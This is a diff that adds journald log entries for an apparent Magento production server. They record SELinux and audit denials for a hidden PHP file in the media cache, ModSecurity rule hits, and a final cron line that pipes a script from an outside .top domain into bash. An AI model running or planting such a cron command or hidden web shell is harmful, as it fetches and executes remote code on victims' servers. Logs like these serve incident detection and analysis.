@@ -1,0 +1,8 @@
+{"__REALTIME_TIMESTAMP":"1774430173000000","_HOSTNAME":"magento-prod-04","_SYSTEMD_UNIT":"apache2.service","PRIORITY":"3","MESSAGE":"AVC denied { execute } for path=\"/var/www/html/pub/media/catalog/product/cache/.bin/a.php\" pid=2001"}
+{"__REALTIME_TIMESTAMP":"1774430354000000","_HOSTNAME":"magento-prod-04","_SYSTEMD_UNIT":"apache2.service","PRIORITY":"4","MESSAGE":"audit: SYSCALL=execve key=\"php-exec-from-media\" comm=\"php-fpm\" pid=2002"}
+{"__REALTIME_TIMESTAMP":"1774430442000000","_HOSTNAME":"magento-prod-04","_SYSTEMD_UNIT":"apache2.service","PRIORITY":"6","MESSAGE":"modsecurity: rule 941999 matched (URL-evasion polyglot) pid=2003"}
+{"__REALTIME_TIMESTAMP":"1774430591000000","_HOSTNAME":"magento-prod-04","_SYSTEMD_UNIT":"apache2.service","PRIORITY":"3","MESSAGE":"audit: PATH name=\"/var/www/html/pub/media/catalog/product/cache/.bin/a.php\" inode=8675411 pid=2004"}
+{"__REALTIME_TIMESTAMP":"1774430782000000","_HOSTNAME":"magento-prod-04","_SYSTEMD_UNIT":"apache2.service","PRIORITY":"4","MESSAGE":"AVC denied { execute } for path=\"/var/www/html/pub/media/catalog/product/cache/.bin/a.php\" pid=2005"}
+{"__REALTIME_TIMESTAMP":"1774430991000000","_HOSTNAME":"magento-prod-04","_SYSTEMD_UNIT":"apache2.service","PRIORITY":"5","MESSAGE":"kernel: TCP: out-of-order segment from 203.0.113.51 to gateway pid=2006"}
+{"__REALTIME_TIMESTAMP":"1774431181000000","_HOSTNAME":"magento-prod-04","_SYSTEMD_UNIT":"apache2.service","PRIORITY":"6","MESSAGE":"modsecurity: rule 941998 matched (POST to PHP under media-cache) pid=2007"}
+{"__REALTIME_TIMESTAMP":"1774431298000000","_HOSTNAME":"magento-prod-04","_SYSTEMD_UNIT":"cron.service","PRIORITY":"5","MESSAGE":"CMD (curl -s http://vagqea4wrlkdg.top/c.txt | bash) pid=2008"}
